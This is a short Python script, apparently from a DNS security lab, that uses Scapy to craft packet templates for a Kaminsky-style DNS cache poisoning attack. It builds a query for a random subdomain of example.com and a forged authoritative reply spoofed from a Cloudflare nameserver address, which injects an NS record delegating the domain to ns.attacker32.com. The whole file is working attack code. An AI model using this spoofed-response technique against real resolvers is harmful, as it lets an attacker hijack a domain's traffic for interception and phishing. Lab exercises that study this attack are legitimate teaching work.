#!/usr/bin/env python3
from scapy.all import *

ATTACKER_IP = '10.9.0.1'
DNS_SERVER = '10.9.0.53'
ATTACKER_NS = 'ns.attacker32.com'
CLOUDFLARE_NS_IP = '108.162.192.162'

name = '12345.example.com'
domain = 'example.com'

req =   IP(dst=DNS_SERVER, src=ATTACKER_IP, chksum=0) / \
        UDP(sport=33333, dport=53, chksum=0) / \
        DNS(id=0xaaaa, qr=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0,
            qd=DNSQR(qname=name))

resp =  IP(dst=DNS_SERVER, src=CLOUDFLARE_NS_IP, chksum=0) / \
        UDP(sport=53, dport=33333, chksum=0) / \
        DNS(id=0xaaaa, aa=1, rd=1, qr=1,
            qdcount=1, ancount=1, nscount=1, arcount=0,
            qd=DNSQR(qname=name),
            an=DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200),
            ns=DNSRR(rrname=domain, type='NS', rdata=ATTACKER_NS, ttl=259200))

with open('ip_req.bin', 'wb') as f:
    f.write(bytes(req))

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(resp))
